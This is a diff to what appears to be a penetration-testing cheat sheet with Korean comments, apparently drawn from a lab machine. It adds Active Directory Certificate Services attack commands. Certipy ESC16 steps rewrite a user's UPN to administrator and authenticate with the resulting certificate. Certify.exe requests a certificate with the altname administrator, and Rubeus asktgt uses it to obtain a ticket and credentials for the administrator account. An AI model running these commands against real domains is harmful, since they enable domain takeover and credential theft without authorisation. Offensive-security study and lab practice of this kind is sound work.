@@ -218,15 +218,34 @@ certipy-ad shadow auto -u <user> -p <password> -account <account> -dc-ip <ip>
 
 certipy-ad find -u <user> -hashes <hashes> -dc-ip <ip> -vulnerable
 
+certipy-ad find -u <user> -p <password> -target <domain/FQDN> -text -stdout -vulnerable
+
 # ESC16 
 certipy-ad account -u <user> -hashes <hashes> -user <CA user> -upn administrator update
 
 certipy-ad account -u <user> -hashes <hashes> -user <CA user> read
 
-certipy-ad req -u <CA user> -hashes <hash> -dc-ip <ip> -target <FQDN> -ca <CA Authority name> -template User
+certipy-ad req -u <CA user> -hashes <hash> -dc-ip <ip> -target <domain/FQDN> -ca <CA Authority name> -template User
 
 # 사용하기 전에 update 된 CA를 롤백 해줘야할수도 있음
 certipy-ad auth -dc-ip <ip> -pfx <pfx file> -u <user> -domain <domain>
+```
+---
+## Certify.exe
+```powershell
+.\Certify.exe find /vulnerable /currentuser
+
+# currentuser의 enrollment permissions를 확인해보기. -> TGT 발급이 가능해짐.
+
+.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
+```
+```bash
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+```powershell
+.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx
+
+.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
 ```
 
 ---
